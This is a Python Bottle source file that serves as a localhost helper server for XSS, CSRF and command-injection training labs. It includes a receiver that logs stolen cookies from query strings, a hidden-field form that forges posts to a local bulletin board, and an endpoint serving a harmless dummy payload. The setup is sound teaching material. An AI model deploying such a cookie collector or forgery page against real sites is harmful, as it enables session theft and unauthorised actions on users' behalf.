import argparse
import datetime
import html
import os
from pathlib import Path

from bottle import get, request, response, run


BASE_DIR = Path(__file__).resolve().parent.parent
LOG_FILE = Path(os.environ.get("STOLEN_COOKIE_LOG", BASE_DIR / "stolen_cookies.log"))


def page(title, body):
    return f"""<!doctype html>
<html lang="ja">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>{html.escape(title)}</title>
  <style>
    body {{ font-family: system-ui, sans-serif; line-height: 1.7; margin: 2rem auto; max-width: 760px; }}
    button {{ cursor: pointer; font: inherit; padding: .35rem .75rem; }}
    pre {{ background: #f5f5f5; overflow-x: auto; padding: 1rem; }}
  </style>
</head>
<body>
  <h1>{html.escape(title)}</h1>
  {body}
  <hr>
  <nav>
    <a href="/">cookie receiver</a>
    <a href="/csrf">csrf page</a>
    <a href="/badscript">badscript</a>
  </nav>
</body>
</html>"""


@get("/")
def receive_cookie():
    cookie_id = request.query.get("cookie_id") or request.query.get("cookie") or request.query_string
    if cookie_id:
        LOG_FILE.write_text(
            (LOG_FILE.read_text(encoding="utf-8") if LOG_FILE.exists() else "")
            + f"{datetime.datetime.now().isoformat(timespec='seconds')} {cookie_id}\n",
            encoding="utf-8",
        )

    log_text = LOG_FILE.read_text(encoding="utf-8") if LOG_FILE.exists() else ""
    return page(
        "Cookie Receiver",
        f"""
        <p>XSSの送信先として使うローカルの受信ページです。</p>
        <p>受信URL例: <code>http://localhost:8090/?cookie_id=...</code></p>
        <h2>Received values</h2>
        <pre>{html.escape(log_text)}</pre>
        """,
    )


@get("/csrf")
def csrf_page():
    comment = "[CSRF] 悪性サイトから投稿されました"
    return page(
        "CSRF Demo",
        f"""
        <p>掲示板にログイン済みのブラウザでボタンを押すと、別サイトから投稿が送信されます。</p>
        <form action="http://localhost:8086/bbs" method="post">
          <input type="hidden" name="token" value="a73+f*&t5">
          <input type="hidden" name="comment" value="{html.escape(comment)}">
          <button type="submit">実行</button>
        </form>
        """,
    )


@get("/badscript")
def badscript():
    response.content_type = "text/plain; charset=utf-8"
    return """from pathlib import Path

Path("badscript_ran.txt").write_text("dummy payload executed\\n", encoding="utf-8")
print("dummy payload executed")
"""


def main():
    parser = argparse.ArgumentParser(description="Local helper server for XSS, CSRF, and command injection labs.")
    parser.add_argument("--host", default=os.environ.get("HOST", "127.0.0.1"))
    parser.add_argument("--port", type=int, default=int(os.environ.get("PORT", "8090")))
    args = parser.parse_args()
    run(host=args.host, port=args.port, debug=True, reloader=False)


if __name__ == "__main__":
    main()
